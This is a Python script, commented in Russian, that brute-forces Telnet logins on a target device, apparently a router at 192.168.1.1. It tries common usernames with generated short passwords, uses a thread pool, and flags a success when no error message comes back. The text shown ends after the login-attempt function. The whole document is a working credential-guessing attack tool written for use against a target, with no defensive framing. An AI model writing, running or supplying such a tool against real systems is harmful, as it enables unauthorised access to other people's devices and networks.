import telnetlib
import itertools
import string
from concurrent.futures import ThreadPoolExecutor

host = "192.168.1.1"  # ЗАМЕНИ на IP цели
port = 23

logins = ["admin", "root", "user", "guest"]
charset = string.ascii_lowercase + string.digits
min_len = 1
max_len = 3
max_threads = 20

found = False

def try_login(username, password):
    global found
    if found:
        return
    try:
        tn = telnetlib.Telnet(host, port, timeout=5)

        # Ожидаем приглашение логина с таймаутом
        idx, _, _ = tn.expect([b"login:", b"Login:"], timeout=3)
        if idx == -1:
            tn.close()
            return

        tn.write(username.encode() + b"\n")

        # Ожидаем запрос пароля
        idx, _, _ = tn.expect([b"Password:", b"password:"], timeout=3)
        if idx == -1:
            tn.close()
            return

        tn.write(password.encode() + b"\n")

        # Ожидаем ответ, ограниченный по времени
        idx, match, text = tn.expect([b"incorrect", b"failed", b"login"], timeout=3)

        if idx == -1:
            # Не нашли ошибок — возможно успех
            print(f"\n[!!!] УСПЕХ: {username}:{password}")
            found = True
        else:
            # Нашли ошибку — значит неудача
            pass

        tn.close()
    except Exception as e:
        # Можно раскомментировать для отладки:
        # print(f"Ошибка: {e}")
        pass
